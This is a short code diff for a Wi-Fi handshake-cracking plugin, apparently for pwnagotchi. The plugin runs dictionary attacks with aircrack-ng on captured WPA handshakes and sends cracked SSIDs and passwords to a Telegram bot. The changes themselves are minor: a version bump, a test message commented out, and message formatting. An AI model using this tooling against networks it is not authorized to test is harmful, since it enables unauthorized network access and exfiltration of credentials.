@@ -17,7 +17,7 @@ Cracked handshakes stored in handshake folder as [essid].pcap.cracked
 
 class QuickDic(plugins.Plugin):
     __author__ = 'silentree12th'
-    __version__ = '1.4.1'
+    __version__ = '1.4.2'
     __license__ = 'GPL3'
     __description__ = 'Run a quick dictionary scan against captured handshakes. Optionally send found passwords as qrcode and plain text over to telegram bot.'
     __dependencies__ = {
@@ -56,8 +56,8 @@ class QuickDic(plugins.Plugin):
         else:
             logging.warning('[quickdic] aircrack-ng is not installed!')
 
-        if self.options['id'] != None and self.options['api'] != None:
-            self._send_message(filename='Android AP', pwd='12345678')
+        #if self.options['id'] != None and self.options['api'] != None:
+            #self._send_message(filename='Android AP', pwd='12345678')
 
     def on_handshake(self, agent, filename, access_point, client_station):
         display = agent.view()
@@ -119,7 +119,7 @@ class QuickDic(plugins.Plugin):
                         # Send the image directly as bytes
                         #message_text = 'ssid: ' + ssid + ' password: ' + password
                         #bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)
-            message_text = f"SSID: {ssid}\nPassword: {password}\n```\n{q.read()}\n```"
+            message_text = f"\nSSID: {ssid}\nPassword: {password}\n```\n{q.read()}\n```"
             bot.send_message(chat_id=chat_id, text=message_text, parse_mode='Markdown')
             logging.info(message_text)
             logging.info("[better_quickdic] QR code content sent to Telegram.")
